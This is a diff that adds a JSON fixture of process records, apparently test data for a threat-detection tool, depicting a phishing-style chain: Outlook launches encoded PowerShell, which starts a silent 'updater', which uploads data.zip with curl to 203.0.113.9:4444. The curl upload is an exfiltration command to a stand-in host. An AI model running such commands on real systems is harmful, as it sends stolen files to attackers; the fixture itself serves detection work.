@@ -1,0 +1,50 @@
+[
+  {
+    "pid": 2200,
+    "name": "outlook.exe",
+    "cmdline": "outlook.exe",
+    "user": "svc_backup",
+    "parent_pid": 1800,
+    "parent_name": "explorer.exe",
+    "hash_sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+    "started_at": "2026-09-26T10:00:20+00:00",
+    "memory_mb": 220.5,
+    "cpu_percent": 1.2
+  },
+  {
+    "pid": 4567,
+    "name": "powershell.exe",
+    "cmdline": "powershell.exe -enc JABwAHIAbwBjACAAPQAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwA=",
+    "user": "svc_backup",
+    "parent_pid": 2200,
+    "parent_name": "outlook.exe",
+    "hash_sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+    "started_at": "2026-09-26T10:14:10+00:00",
+    "memory_mb": 96.1,
+    "cpu_percent": 12.0
+  },
+  {
+    "pid": 4600,
+    "name": "updater.exe",
+    "cmdline": "C:\\Temp\\updater.exe --silent",
+    "user": "svc_backup",
+    "parent_pid": 4567,
+    "parent_name": "powershell.exe",
+    "hash_sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
+    "started_at": "2026-09-26T10:15:00+00:00",
+    "memory_mb": 14.3,
+    "cpu_percent": 3.1
+  },
+  {
+    "pid": 4700,
+    "name": "curl.exe",
+    "cmdline": "curl.exe -T C:\\Temp\\data.zip http://203.0.113.9:4444/up",
+    "user": "svc_backup",
+    "parent_pid": 4600,
+    "parent_name": "updater.exe",
+    "hash_sha256": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
+    "started_at": "2026-09-26T10:16:15+00:00",
+    "memory_mb": 4.2,
+    "cpu_percent": 8.4
+  }
+]
